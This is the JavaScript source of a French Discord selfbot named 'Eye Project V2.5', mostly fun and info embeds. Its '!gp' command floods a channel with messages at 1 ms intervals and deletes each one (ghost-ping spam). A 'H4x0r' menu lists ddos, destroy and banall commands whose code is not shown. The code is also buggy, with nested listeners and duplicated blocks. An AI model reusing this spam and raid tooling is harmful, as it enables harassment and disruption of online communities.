const Discord = require('discord.js')
const client = new Discord.Client()
const moment = require('moment');
const figlet = require('figlet');
const colors = require('colors');
const readline = require('readline');
const superagent = require("superagent");
const chancejs = require("chance");
const chance = new chancejs();

const config = require('./config.json');

var start = Date.now();

client.on('ready', function () {
  console.log("Lunch")
})


client.on('message', message => {
  var prefix = '!'

  if (message.content.includes(prefix + "h4x0r")) {
    if (message.author.id === client.user.id) {

      var embed = new Discord.RichEmbed()
        .setTitle('𝐒𝐞𝐥𝐟𝐁𝐨𝐭 || 【 𝐇𝟒𝐱𝟎𝐫 】')
        .addField(' 🠶 𝐃𝐝𝐨𝐬', "󠂪┍ !ddos ┙", true)
        .addField(' 🠶 𝐃𝐞𝐬𝐭𝐫𝐨𝐲', "┍ !destroy ┙󠂪", true)
        .addField(' 🠶 𝐁𝐚𝐧𝐀𝐥𝐥', "┍ !banall󠂪 ┙󠂪", true)
        .addField(' 🠶 𝐂𝐫𝐞𝐚𝐭𝐞𝐂𝐡𝐚𝐧𝐧𝐞𝐥', "┍ !createchannel ┙󠂪󠂪", true)
        .addField(' 🠶 𝐃𝐞𝐥𝐞𝐭𝐞𝐂𝐡𝐚𝐧𝐧𝐞𝐥', "┍󠂪 !delchannel ┙󠂪", true)
        .addField(' 🠶 𝐑𝐨𝐥𝐞𝐂𝐫𝐞𝐚𝐭𝐞', "󠂪┍ !rolecreate ┙󠂪", true)
        .addField(' 🠶 𝐃𝐞𝐥𝐞𝐭𝐞𝐑𝐨𝐥𝐞', "┍ !delrole󠂪 ┙󠂪", true)
        .setImage('https://i.pinimg.com/originals/8f/be/a4/8fbea478fbef25a8aa1e13536e466adf.gif')
        .setColor(0x000001)
        .setFooter('▁ ▂ ▄ ▅ ▆ ▇ █ 𝐄𝐲𝐞 𝐏𝐫𝐨𝐣𝐞𝐜𝐭 𝐕𝟐.𝟓 █ ▇ ▆ ▅ ▄ ▂ ▁')
      message.channel.sendEmbed(embed);
    }
  }
  if (message.content.includes(prefix + "help")) {
    if (message.author.id === client.user.id) {
      if (message.deletable) message.delete();

      var embed = new Discord.RichEmbed()
        .setTitle('𝐒𝐞𝐥𝐟𝐁𝐨𝐭 || 𝐄𝐲𝐞 𝐏𝐫𝐨𝐣𝐞𝐜𝐭 𝐕𝟐.𝟓')
        .setDescription('')
        .addField(' :eye: 𝐇𝟒𝐱𝟎𝐫 :eye: ', "𝓣'𝓪𝒇𝒇𝓲𝓬𝓱𝒆 ℒ𝒆 ℳ𝒆𝓷𝓾 𝓓𝓾 ℋ𝟒𝔁𝟎𝓻")
        .addField(' :eye: 𝐅𝐮𝐧 :eye: ', "𝓣'𝓪𝒇𝒇𝓲𝓬𝓱𝒆 ℒ𝒆 ℳ𝒆𝓷𝓾 ℱ𝓾𝓷")
        .addField(' :eye: 𝐓𝐨𝐨𝐥𝐬 :eye: ', "𝓣'𝓪𝒇𝒇𝓲𝓬𝓱𝒆 ℒ𝒆 ℳ𝒆𝓷𝓾 𝓓𝒆𝓼 𝓣𝓸𝓸𝓵𝓼")
        .addField(' :eye: 𝐌𝐨𝐝𝐞́𝐫𝐚𝐭𝐢𝐨𝐧 :eye: ', "𝓣'𝓪𝒇𝒇𝓲𝓬𝓱𝒆 ℒ𝒆 ℳ𝒆𝓷𝓾 𝓓𝒆𝓼 ℳ𝓸𝓭𝒆́𝓻𝓪𝓽𝓲𝓸𝓷")
        .setImage('https://media1.tenor.com/images/3ae790895549594b5fce2d5072767f87/tenor.gif?itemid=10952253')
        .setColor(0x000001)
        .setFooter('▁ ▂ ▄ ▅ ▆ ▇ █ 𝐄𝐲𝐞 𝐏𝐫𝐨𝐣𝐞𝐜𝐭 𝐕𝟐.𝟓 █ ▇ ▆ ▅ ▄ ▂ ▁')
      message.channel.sendEmbed(embed);
    }
  }
   if (message.content.includes(prefix + "fun")) {
    if (message.author.id === client.user.id) {
      if (message.deletable) message.delete();

      var embed = new Discord.RichEmbed()
        .setTitle('')
        .setDescription('𝐒𝐞𝐥𝐟𝐁𝐨𝐭 || 【 𝐅𝐮𝐧 】')
        .addField('  𝐇𝐮𝐠  ', `:hugging: 𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙐𝙣𝙚 𝙄𝙢𝙖𝙜𝙚 𝙃𝙪𝙜\n` + "󠂪")
        .addField('  𝐊𝐢𝐬𝐬  ', `:kiss: 𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙐𝙣𝙚 𝙄𝙢𝙖𝙜𝙚 𝙆𝙞𝙨𝙨\n` + "󠂪")
        .addField('  𝐋𝐨𝐯𝐞  ', `:hearts: 𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙐𝙣𝙚 𝙄𝙢𝙖𝙜𝙚 𝙇𝙤𝙫𝙚\n` + "󠂪")
        .addField('  𝐈𝐬𝐬𝐨𝐮  ', `:clown: 𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙐𝙣𝙚 𝙄𝙢𝙖𝙜𝙚 𝙄𝙎𝙎𝙊𝙐\n` + "󠂪")
        .addField('  𝐁𝐥𝐜  ', `:middle_finger: 𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙐𝙣𝙚 𝙄𝙢𝙖𝙜𝙚 𝘽𝙡𝙘\n` + "󠂪")
        .addField('  𝐏𝐮𝐧𝐜𝐡  ', `:boxing_glove: 𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙐𝙣𝙚 𝙄𝙢𝙖𝙜𝙚 𝙋𝙪𝙣𝙘𝙝\n` + "󠂪")
        .addField('  𝐊𝐚𝐫𝐦𝐚  ', `:smiling_imp: 𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙐𝙣𝙚 𝙄𝙢𝙖𝙜𝙚 𝙆𝙖𝙧𝙢𝙖\n` + "󠂪")
        .addField('  𝐒𝐚𝐝  ', `:sob: 𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙐𝙣𝙚 𝙄𝙢𝙖𝙜𝙚 𝙎𝙖𝙙\n` + "󠂪")
        .addField('  𝐍𝐞𝐤𝐨  ', `:heart_eyes_cat: 𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙐𝙣𝙚 𝙄𝙢𝙖𝙜𝙚 𝙉𝙚𝙠𝙤\n` + "󠂪")
        .addField('  𝟖𝐁𝐚𝐥𝐥  ', `:game_die: 𝙍𝙚𝙥𝙤𝙣𝙙 𝙖 𝙩𝙖 𝙦𝙪𝙚𝙨𝙩𝙞𝙤𝙣 \n` + "󠂪")
        .setImage('https://78.media.tumblr.com/efe16480a0a8925cf27711234b94a794/tumblr_ovm2yl134K1v07xajo2_500.gif')
        .setColor(0x000001)
        .setFooter('▁ ▂ ▄ ▅ ▆ ▇ █ 𝐄𝐲𝐞 𝐏𝐫𝐨𝐣𝐞𝐜𝐭 𝐕𝟐.𝟓 █ ▇ ▆ ▅ ▄ ▂ ▁')
      message.channel.sendEmbed(embed);
    }
  }
  if (message.content.includes(prefix + "tools")) {
    if (message.author.id === client.user.id) {
      if (message.deletable) message.delete();

      var embed = new Discord.RichEmbed()
        .setTitle('𝐒𝐞𝐥𝐟𝐁𝐨𝐭 || 【 𝐓𝐨𝐨𝐥𝐬 】')
        .setDescription('')
        .addField(' 🌴 𝐔𝐬𝐞𝐫𝐈𝐧𝐟𝐨 🌴 ', "𝓐𝒇𝒇𝓲𝓬𝓱𝒆 𝓭𝒆𝓼 𝓘𝓷𝒇𝓸 𝓼𝓾𝓻 𝓵𝓪 𝓹𝒆𝓻𝓼𝓸𝓷𝓷𝒆 𝓶𝒆𝓷𝓽𝓲𝓸𝓷𝓷𝒆𝓻")
        .addField(' 🌴 𝐔𝐬𝐞𝐫𝐏𝐯𝐈𝐧𝐟𝐨 🌴 ', "𝓐𝒇𝒇𝓲𝓬𝓱𝒆 𝓭𝒆𝓼 𝓘𝓷𝒇𝓸 𝓔𝓷 𝓓ℳ (ℳ𝓸𝓲𝓷 𝓓'𝓲𝓷𝒇𝓸)")
        .addField(' 🌴 𝐒𝐞𝐫𝐯𝐞𝐫𝐈𝐧𝐟𝐨 🌴 ', "𝓐𝒇𝒇𝓲𝓬𝓱𝒆 𝓭𝒆𝓼 𝓘𝓷𝒇𝓸 𝓼𝓾𝓻 𝓵𝒆 𝓼𝒆𝓻𝓿𝒆𝓾𝓻 ")
        .addField(' 🌴 𝐀𝐯𝐚𝐭𝐚𝐫 🌴 ', "𝓐𝒇𝒇𝓲𝓬𝓱𝒆 𝓵'𝓪𝓿𝓪𝓽𝓪𝓻 𝓭𝒆 𝓵𝓪 𝓹𝒆𝓻𝓼𝓸𝓷𝓷𝒆 𝓶𝒆𝓷𝓽𝓲𝓸𝓷𝓷𝒆𝓻")
        .addField(' 🌴 𝐒𝐭𝐫𝐞𝐚𝐦 🌴 ', "𝓐𝓬𝓽𝓲𝓿𝒆 𝓽𝓸𝓷 𝓼𝓽𝓪𝓽𝓾𝓼 𝒆𝓷 𝓼𝓽𝓻𝒆𝓪𝓶𝓲𝓷𝓰")
        .addField(' 🌴 𝐌𝐮𝐥𝐭𝐢𝐒𝐭𝐫𝐞𝐚𝐦 🌴 ', "𝓐𝓬𝓽𝓲𝓿𝒆 𝓽𝓸𝓷 𝓼𝓽𝓪𝓽𝓾𝓼 𝒆𝓷 𝓼𝓽𝓻𝒆𝓪𝓶𝓲𝓷𝓰")
        .addField(' 🌴 𝐌𝐮𝐬𝐢𝐜 🌴 ', "𝓐𝓬𝓽𝓲𝓿𝒆 𝓽𝓸𝓷 𝓼𝓽𝓪𝓽𝓾𝓼 𝒆𝓷 𝓔𝓬𝓸𝓾𝓽𝒆 𝓭𝒆 𝓵𝓪 ℳ𝓾𝓼𝓲𝓬")
        .addField(' 🌴 𝐏𝐥𝐚𝐲 🌴 ', "𝓐𝓬𝓽𝓲𝓿𝒆 𝓽𝓸𝓷 𝓼𝓽𝓪𝓽𝓾𝓼 𝒆𝓷 𝓟𝓵𝓪𝔂𝓲𝓷𝓰")
        .addField(' 🌴 𝐖𝐚𝐭𝐜𝐡 🌴 ', "𝓐𝓬𝓽𝓲𝓿𝒆 𝓽𝓸𝓷 𝓼𝓽𝓪𝓽𝓾𝓼 𝒆𝓷 𝓦𝓪𝓽𝓬𝓱𝓲𝓷𝓰")
        .setImage('https://media1.tenor.com/images/5bd1d2398a6ed4a84bf9ee0829de9e7a/tenor.gif?itemid=11582624')
        .setColor(0x000001)
        .setFooter('▁ ▂ ▄ ▅ ▆ ▇ █ 𝐄𝐲𝐞 𝐏𝐫𝐨𝐣𝐞𝐜𝐭 𝐕𝟐.𝟓 █ ▇ ▆ ▅ ▄ ▂ ▁')
      message.channel.sendEmbed(embed);
    }
  }
  if (message.content.includes(prefix + "moderation")) {
    if (message.author.id === client.user.id) {
      if (message.deletable) message.delete();

      var embed = new Discord.RichEmbed()
        .setTitle('𝐒𝐞𝐥𝐟𝐁𝐨𝐭 || 【 𝐌𝐨𝐝𝐞́𝐫𝐚𝐭𝐢𝐨𝐧 】')
        .setDescription('')
        .addField(' 🌴 𝐁𝐚𝐧 🌴 ', "ℬ𝓪𝓷 𝓵𝓪 𝓹𝒆𝓻𝓼𝓸𝓷𝓷𝒆 𝓶𝒆𝓷𝓽𝓲𝓸𝓷𝓷𝒆𝓻")
        .addField(' 🌴 𝐊𝐢𝐜𝐤 🌴 ', "𝓚𝓲𝓬𝓴 𝓵𝓪 𝓹𝒆𝓻𝓼𝓸𝓷𝓷𝒆 𝓶𝒆𝓷𝓽𝓲𝓸𝓷𝓷𝒆𝓻")
        .addField(' 🌴 𝐏𝐮𝐫𝐠𝐞 🌴 ', "𝓢𝓾𝓹𝓻𝓲𝓶𝓶𝒆 𝓽𝓸𝓾𝓼 𝓵𝒆𝓼 𝓶𝒆𝓼𝓼𝓪𝓰𝒆 ")
        .addField(' 🌴 𝐂𝐥𝐞𝐚𝐫 🌴 ', "𝓔𝒇𝒇𝓪𝓬𝒆 𝓵𝒆 𝓷𝓸𝓶𝓫𝓻𝒆 𝓭𝒆 𝓶𝒆𝓼𝓼𝓪𝓰𝒆 𝓿𝓸𝓾𝓵𝓾 ")
        .setImage('https://cdn.discordapp.com/attachments/575651867091009536/575678501454348289/Eye.gif')
        .setColor(0x000001)
        .setFooter('▁ ▂ ▄ ▅ ▆ ▇ █ 𝐄𝐲𝐞 𝐏𝐫𝐨𝐣𝐞𝐜𝐭 𝐕𝟐.𝟓 █ ▇ ▆ ▅ ▄ ▂ ▁')
      message.channel.sendEmbed(embed);
    }
  }
  if (message.content.includes(prefix + "karma")) {
    if (message.author.id === client.user.id) {
      if (message.deletable) message.delete();

      let user;

      if (message.mentions.users.first()) {
        user = message.mentions.users.first();
      } else {
        user = message.author;
      }

      var embed = new Discord.RichEmbed()
        .setTitle(`𝐒𝐞𝐥𝐟𝐁𝐨𝐭 || 𝐋𝐞 𝐊𝐚𝐫𝐦𝐚 𝐅𝐢𝐧𝐢 𝐓𝐨𝐮𝐣𝐨𝐮𝐫 𝐏𝐚𝐫 𝐅𝐫𝐚𝐩𝐩𝐞𝐫 ${user.username}`)
        .setDescription('')
        .setImage('https://images-ext-1.discordapp.net/external/5Nl_e_iULm-bhZfcQATDWbf4LZMm1rQtMu6jn5iKlCo/%3Fcid%3D790b76115cceb0a262597a6d36b8c480%26rid%3Dgiphy.gif/https/media3.giphy.com/media/xT8qBiKHzCnrh67R7O/giphy.gif')
        .setColor(0x000001)
        .setFooter('▁ ▂ ▄ ▅ ▆ ▇ █ 𝐄𝐲𝐞 𝐏𝐫𝐨𝐣𝐞𝐜𝐭 𝐕𝟐.𝟓 █ ▇ ▆ ▅ ▄ ▂ ▁')
      message.channel.sendEmbed(embed);
    }
  }
  if (message.content.includes(prefix + "sad")) {
    if (message.author.id === client.user.id) {
      if (message.deletable) message.delete();

      var embed = new Discord.RichEmbed()
        .setTitle('𝐒𝐞𝐥𝐟𝐁𝐨𝐭 || 𝐓𝐫𝐢𝐬𝐭𝐞...𝐬𝐧𝐢𝐟 𝐬𝐧𝐢𝐟')
        .setDescription('')
        .setImage('https://cdn.discordapp.com/attachments/575864368613425152/578632138472161280/SadNaruto.gif')
        .setColor(0x000001)
        .setFooter('▁ ▂ ▄ ▅ ▆ ▇ █ 𝐄𝐲𝐞 𝐏𝐫𝐨𝐣𝐞𝐜𝐭 𝐕𝟐.𝟓 █ ▇ ▆ ▅ ▄ ▂ ▁')
      message.channel.sendEmbed(embed);
    }
  }
  if (message.content.includes(prefix + "love")) {
    if (message.author.id === client.user.id) {
      if (message.deletable) message.delete();

      if (message.mentions.users.first()) {
        user = message.mentions.users.first();
      } else {
        user = message.author;
      }

      var embed = new Discord.RichEmbed()
        .setTitle(`𝐒𝐞𝐥𝐟𝐁𝐨𝐭 || 𝐉𝐞 𝐭'𝐚𝐢𝐦𝐞 <𝟑 ${user.username}`)
        .setDescription('')
        .setImage('https://cdn.discordapp.com/attachments/575843392580354058/576035832385896448/love.gif')
        .setColor(0x000001)
        .setFooter('▁ ▂ ▄ ▅ ▆ ▇ █ 𝐄𝐲𝐞 𝐏𝐫𝐨𝐣𝐞𝐜𝐭 𝐕𝟐.𝟓 █ ▇ ▆ ▅ ▄ ▂ ▁')
      message.channel.sendEmbed(embed);
    }
  }
  if (message.content.includes(prefix + "blc")) {
    if (message.author.id === client.user.id) {
      if (message.deletable) message.delete();

      var embed = new Discord.RichEmbed()
        .setTitle("𝐒𝐞𝐥𝐟𝐁𝐨𝐭 || 𝐉𝐞 𝐦'𝐞𝐧 𝐁𝐥𝐜 𝐃𝐞 𝐒𝐞 𝐐𝐮𝐞 𝐓𝐮 𝐃𝐢𝐭")
        .setDescription('')
        .setImage('https://cdn.discordapp.com/attachments/562710933244477465/575628028197994504/blc.gif')
        .setColor(0x000001)
        .setFooter('▁ ▂ ▄ ▅ ▆ ▇ █ 𝐄𝐲𝐞 𝐏𝐫𝐨𝐣𝐞𝐜𝐭 𝐕𝟐.𝟓 █ ▇ ▆ ▅ ▄ ▂ ▁')
      message.channel.sendEmbed(embed);
    }
  }
  if (message.content.includes(prefix + "issou")) {
    if (message.author.id === client.user.id) {
      if (message.deletable) message.delete();

      var embed = new Discord.RichEmbed()
        .setTitle("𝐒𝐞𝐥𝐟𝐁𝐨𝐭 || 𝐈𝐒𝐒𝐎𝐔")
        .setDescription('')
        .setImage('https://cdn.discordapp.com/attachments/562710933244477465/575629593994592256/issou.gif')
        .setColor(0x000001)
        .setFooter('▁ ▂ ▄ ▅ ▆ ▇ █ 𝐄𝐲𝐞 𝐏𝐫𝐨𝐣𝐞𝐜𝐭 𝐕𝟐.𝟓 █ ▇ ▆ ▅ ▄ ▂ ▁')
      message.channel.sendEmbed(embed);
    }
  }
  if (message.content.includes(prefix + "punch")) {
    if (message.author.id === client.user.id) {
      if (message.deletable) message.delete();

      var embed = new Discord.RichEmbed()
        .setTitle("𝐒𝐞𝐥𝐟𝐁𝐨𝐭 || 𝐏𝐫𝐞𝐧𝐝 𝐂̧𝐚 𝐃𝐚𝐧𝐬 𝐓𝐚 𝐁𝐨𝐮𝐜𝐡𝐞 𝐅𝐝𝐩")
        .setDescription('')
        .setImage('https://cdn.discordapp.com/attachments/562710933244477465/575632134816137226/punch.gif')
        .setColor(0x000001)
        .setFooter('▁ ▂ ▄ ▅ ▆ ▇ █ 𝐄𝐲𝐞 𝐏𝐫𝐨𝐣𝐞𝐜𝐭 𝐕𝟐.𝟓 █ ▇ ▆ ▅ ▄ ▂ ▁')
      message.channel.sendEmbed(embed);
    }
  }
  if (message.content.includes(prefix + "kiss")) {
    if (message.author.id === client.user.id) {
	  

      if (message.mentions.users.first()) {
        user = message.mentions.users.first();
      } else {
        user = message.author;
      }


var answer = ["https://cdn.weeb.sh/images/B1yv36_PZ.gif",
        'https://cdn.weeb.sh/images/BJv0o6uDZ.gif',
        'https://cdn.weeb.sh/images/rJeB2aOP-.gif',
        'https://cdn.weeb.sh/images/H1a42auvb.gif',
        'https://cdn.weeb.sh/images/Sk1k3TdPW.gif',
        'https://cdn.weeb.sh/images/r1H42advb.gif',
        'https://cdn.weeb.sh/images/rJoL2pdvb.gif',
        'https://cdn.weeb.sh/images/HJkxXNtjZ.gif',
        'https://cdn.weeb.sh/images/SJ8I2Tuv-.gif',
        'https://cdn.weeb.sh/images/Bkk_hpdv-.gif',
        'https://cdn.weeb.sh/images/Bkuk26uvb.gif',
        'https://cdn.weeb.sh/images/HJlWhpdw-.gif',
        'https://cdn.weeb.sh/images/HJ5khTOP-.gif',
        'https://cdn.weeb.sh/images/rymvn6_wW.gif',
        'https://cdn.weeb.sh/images/HJce2pdv-.gif',
        'https://cdn.weeb.sh/images/ByoCoT_vW.gif'];


      const ballEmbed = new Discord.RichEmbed()
        .setTitle(`𝐒𝐞𝐥𝐟𝐁𝐨𝐭 || 𝐌𝐨𝐮𝐚𝐡𝐡𝐡 𝐁𝐢𝐬𝐨𝐮 ${user.username}`)
        .setDescription('')
        .setImage(answer[Math.round(Math.random() * (answer.length - 1))] + ' ')
        .setColor(0x000001)
        .setFooter('▁ ▂ ▄ ▅ ▆ ▇ █ 𝐄𝐲𝐞 𝐏𝐫𝐨𝐣𝐞𝐜𝐭 𝐕𝟐.𝟓 █ ▇ ▆ ▅ ▄ ▂ ▁')
      message.channel.send(ballEmbed);
    }
  }
  if (message.content.includes(prefix + "hug")) {
    if (message.author.id === client.user.id) {
      if (message.deletable) message.delete();

      var embed = new Discord.RichEmbed()
        .setTitle("𝐒𝐞𝐥𝐟𝐁𝐨𝐭 || 𝐆𝐫𝐨𝐬 𝐂𝐚𝐥𝐢𝐧𝐧𝐧")
        .setDescription('')
        .setImage('https://cdn.weeb.sh/images/HkQs_dXPZ.gif')
        .setColor(0x000001)
        .setFooter('▁ ▂ ▄ ▅ ▆ ▇ █ 𝐄𝐲𝐞 𝐏𝐫𝐨𝐣𝐞𝐜𝐭 𝐕𝟐.𝟓 █ ▇ ▆ ▅ ▄ ▂ ▁')
      message.channel.sendEmbed(embed);
    }
  } 
  if (message.content.includes(prefix + "avatar")) {
    if (message.author.id === client.user.id) {
      if (message.deletable) message.delete();

      let user = message.mentions.users.first() ? message.mentions.users.first() : message.author
      let ava = user.displayAvatarURL
      var embed = new Discord.RichEmbed()
        .setDescription("**Voici l'avatar de : " + user.username + " ** [   󠇰󠇰󠇰󠇰 ](" + ava + ")")
        .setImage(ava + '?size=2048')
        .setColor(0x000001)
      message.channel.sendEmbed(embed);
    }
  }
  if (message.content.includes(prefix + "ping")) {
    if (message.author.id === client.user.id) {
      if (message.deletable) message.delete();


      let embed = new Discord.RichEmbed()
        .setColor(0x000001)
        .setDescription(`Loading...`)
      message.channel.send(embed).then(message => {
        embed.setColor(0x000001)
        embed.setDescription(`𝐓𝐮 𝐅𝐚𝐢𝐭 ||\`${client.pings[0]}ms\`||`)
        embed.setFooter(` 𝐄𝐲𝐞 𝐏𝐫𝐨𝐣𝐞𝐜𝐭 𝐕𝟐.𝟓 `)
        message.edit(embed)
      })

    }
  }
  if (message.content === prefix + "channel"){
    if (message.author.id === client.user.id) {
if (message.deletable) message.delete();
const categories = message.guild.channels.filter(c => c.type === "category")
const text = message.guild.channels.filter(c => c.type === "text")
const voice = message.guild.channels.filter(c => c.type === "voice")
var category_embed = new Discord.RichEmbed()
.setAuthor("💎 Sfr™ 💎")
.setFooter("𝙎𝙚𝙡𝙛𝘽𝙤𝙩 𝙗𝙮 Sfr©")
.setColor('#073DF4')
.addField("Category List", categories.map(c => c.name))
message.channel.sendEmbed(category_embed);
var text_embed = new Discord.RichEmbed()
.setAuthor("💎 Sfr™ 💎")
.setFooter("𝐒𝐞𝐥𝐟𝐁𝐨𝐭 𝐛𝐲 Sfr©")
.setColor('#F6F7FA')
.addField("Text Channel List", text.map(c => c.name))
message.channel.sendEmbed(text_embed);
var voice_embed = new Discord.RichEmbed()
.setAuthor("💎 Sfr™ 💎")
.setFooter("𝐒𝐞𝐥𝐟𝐁𝐨𝐭 𝐛𝐲 Sfr©")
.setColor('#080000')
.addField("Voice Channel List", voice.map(c => c.name))
message.channel.sendEmbed(voice_embed);
}
  }
    if (message.content.includes(prefix + "userinfo")) {
      if (message.author.id === client.user.id) {
        if (message.deletable) message.delete();
  
        let user;
  
        if (message.mentions.users.first()) {
          user = message.mentions.users.first();
        } else {
          user = message.author;
        }
  
        let statu = {
          "online": ":white_check_mark: En Ligne",
          "dnd": ":no_entry: Ne Pas Deranger",
          "offline": ":zzz: Hors Ligne",
          "idle": ":large_orange_diamond: Inactif"
        };

   
        const member = message.guild.member(user);
  
        const embed = new Discord.RichEmbed()
          .setColor(0x000001)
          .setThumbnail(user.avatarURL)
          .setTitle(`𝐒𝐞𝐥𝐟𝐁𝐨𝐭 || 𝐕𝐨𝐢𝐜𝐢 𝐋𝐞𝐬 𝐈𝐧𝐟𝐨 𝐃𝐞 ${user.username}#${user.discriminator}`)
          .addField('𝙉𝙞𝙘𝙠𝙉𝙖𝙢𝙚 :', `${member.nickname !== null ? `${member.nickname}` : 'Pas De NickName'}`, true)
          .addField('𝙄𝘿 :', `${user.id}`, true)
          .addField('𝘾𝙤𝙢𝙥𝙩𝙚 𝙘𝙧𝙚́𝙚𝙧 𝙡𝙚 :', `${moment.utc(user.createdAt).format('dddd Do MMMM YYYY 𝙖 HH:ss')}`, true)
          .addField('𝙍𝙚𝙟𝙤𝙞𝙣 𝙡𝙚 𝙨𝙚𝙧𝙫𝙚𝙪𝙧 𝙡𝙚 :', `${moment.utc(member.joinedAt).format('dddd Do MMMM YYYY 𝙖 HH:ss')}`, true)
          .addField('𝙎𝙩𝙖𝙩𝙪𝙨 :', `${statu[user.presence.status]}`, true)
          .addField('𝙅𝙤𝙪𝙚 𝙖 :', `${user.presence.game ? user.presence.game.name : 'Aucun Jeux'}`, true)
          .addField('𝙍𝙤𝙡𝙚𝙨 :', member.roles.map(roles => `${roles.name}`).join(', '), true)
          .setFooter(`𝐈𝐧𝐟𝐨 𝐃𝐞𝐦𝐚𝐧𝐝𝐞𝐫 𝐏𝐚𝐫 ${message.author.username}#${message.author.discriminator}`)
        embed.setTimestamp()
  
        message.channel.send({ embed });
      }
    }
  if (message.content.includes(prefix + "userpvinfo")) {
    if (message.author.id === client.user.id) {
      if (message.deletable) message.delete();

      let user;

      if (message.mentions.users.first()) {
        user = message.mentions.users.first();
      } else {
        user = message.author;
      }

      const embed = new Discord.RichEmbed()
        .setColor(0x000001)
        .setThumbnail(user.avatarURL)
        .setTitle(`𝐒𝐞𝐥𝐟𝐁𝐨𝐭 || 𝐕𝐨𝐢𝐜𝐢 𝐋𝐞𝐬 𝐈𝐧𝐟𝐨 𝐃𝐞 ${user.username}#${user.discriminator}`)
        .addField('𝓘𝓓 :', `${user.id}`, true)
        .addField('𝓒𝓸𝓶𝓹𝓽𝒆 𝓬𝓻𝒆́𝒆𝓻 𝓵𝒆 :', `${moment.utc(user.createdAt).format('dddd, MMMM Do YYYY, HH:ss')}`, true)
        .addField('𝓢𝓽𝓪𝓽𝓾𝓼 :', `${user.presence.status}`, true)
        .addField('𝓙𝓸𝓾𝒆 𝓪 :', `${user.presence.game ? user.presence.game.name : 'None'}`, true)
        .setFooter(`𝐈𝐧𝐟𝐨 𝐃𝐞𝐦𝐚𝐧𝐝𝐞𝐫 𝐏𝐚𝐫 ${message.author.username}#${message.author.discriminator}`)
      embed.setTimestamp()

      message.channel.send({ embed });
    }
  }
  client.on('message', message => {

    var argresult = message.content.split(` `).slice(1).join(' ');

    if (message.content.includes(prefix + "gp")) {
        if (message.author.id == client.user.id) {
            message.delete()
        try {
            var timesRun = 0;
            var numberspam = argresult[0];
            var tospam = message.content.split(' ').slice(2).join(' ');
            let messagecount = parseInt(numberspam) ? parseInt(numberspam) : 1;
           var interval = setInterval(function() {
               message.channel.send(tospam).then(m => {
                   m.delete()
               });
               timesRun += 1
               if (timesRun === messagecount) {
                   clearInterval(interval)
               }
           }, 1)
           message.channel.send(interval.length);
            } catch (err) {
            }
            } else {

            }
        }
});
  if (message.content.includes(prefix + "serverinfo")) {
    if (message.author.id === client.user.id) {
      if (message.deletable) message.delete();

      function checkDays(date) {
        let now = new Date();
        let diff = now.getTime() - date.getTime();
        let days = Math.floor(diff / 86400000);
        return days + (days == 1 ? " day" : " days") + " ago";
    };


const verificationLevels = ['Aucune Restriction', 'E-mail vérifié', 'Inscrit depuis plus de 5min minimum', 'Membre du serveur depuis plus de 10minutes', 'Téléphone Vérifié'];

let region = {
  "brazil": ":flag_br: Brazil",
  "eu-central": ":flag_eu: Central Europe",
  "singapore": ":flag_sg: Singapore",
  "us-central": ":flag_us: U.S. Central",
  "sydney": ":flag_au: Sydney",
  "us-east": ":flag_us: U.S. East",
  "us-south": ":flag_us: U.S. South",
  "us-west": ":flag_us: U.S. West",
  "eu-west": ":flag_eu: Western Europe",
  "vip-us-east": ":flag_us: VIP U.S. East",
  "london": ":flag_gb: London",
  "amsterdam": ":flag_nl: Amsterdam",
  "hongkong": ":flag_hk: Hong Kong",
  "russia": ":flag_ru: Russia",
  "southafrica": ":flag_za:  South Africa"
};
      let icon = message.guild.iconURL;
      let embed = new Discord.RichEmbed()
        .setAuthor('🔰|ServerInfo')
        .setColor(0x000001)
        .setThumbnail(icon)
        .addField(':scroll:| Nom Du Serveur :', `🠶  ${message.guild.name}`, true)
        .addField(':id:| ID Du Serveur :', `🠶  ${message.guild.id}\n` + "󠂪", true)
        .addBlankField()
        .addField(':white_check_mark:| Securiter Du Serveur :', `🠶  ${verificationLevels[message.guild.verificationLevel]}\n` + "󠂪", true)
        .addField(':calendar_spiral:| Serveur Créer Le :', `🠶  ${message.channel.guild.createdAt.toUTCString().substr(0, 16)} (${checkDays(message.channel.guild.createdAt)})`, true)
        .addBlankField()
        .addField(':crown:| Couronne Du Serveur :', `🠶  ${message.guild.owner.user.tag}\n` + "󠂪", true)
        .addField(':pushpin:| Region :', `🠶  ${region[message.guild.region]}`, true)
		    .addField(":warning:Pour Plus D'information Sur Le Server Tape:warning:", '🠶!infoplus', true)
        .setFooter(`ServeurInfo Demander Par : ${message.author.username}#${message.author.discriminator}`)
        embed.setTimestamp();

      message.channel.send(embed);

    }
  }
  if (message.content === prefix + "fdp"){
        if (message.deletable) message.delete();

	
  }
  
  if (message.content.includes(prefix + "serverinfo")) {
    if (message.author.id === client.user.id) {
      if (message.deletable) message.delete();

      let icon = message.guild.iconURL;
      let embed = new Discord.RichEmbed()
	  
        .setColor(0x000001)
        .setTitle('***Stats Roles/Channels***')
		    .addField(':hammer_pick:| Roles Totals :', `🠶  ${message.guild.roles.size}`, true)
        .addField(':pencil:| Channels Totals :', `🠶  ${message.guild.channels.size}`, true)
        embed.setTimestamp();
		
		message.channel.send(embed);
	    }
  }
  if (message.content.includes(prefix + "serverinfo")) {
    if (message.author.id === client.user.id) {
      if (message.deletable) message.delete();

  var resp = 
  ":spy: **__Membre Total__** : " + message.guild.memberCount + "\n\n" +
  ":white_check_mark: **En Ligne** : " + message.guild.members.filter(o => o.presence.status === 'online').size + " | " +
  ":no_entry:  **Ne Pas Deranger** : " + message.guild.members.filter(d => d.presence.status === 'dnd').size + "\n" +
  ":large_orange_diamond: **Inactif** : " + message.guild.members.filter(i => i.presence.status === 'idle').size + " | " +
  ":zzz: **Hors Ligne** : " + message.guild.members.filter(a => a.presence.status === 'offline').size;

let embed = new Discord.RichEmbed()
  .setColor(0x000001)
  .setDescription(resp)
  .setTitle("***Stats Membre***");
  embed.setTimestamp();

message.channel.send(embed);
}
  } 
  

  if (message.content.includes(prefix + "8ball")) {
    if (message.author.id === client.user.id) {


      let question = message.content.split(/\s+/g).slice(1).join(" ");

      if (!question) {
        return message.channel.send('You must provide a question! **Usage: -8ball <question>**');

      }

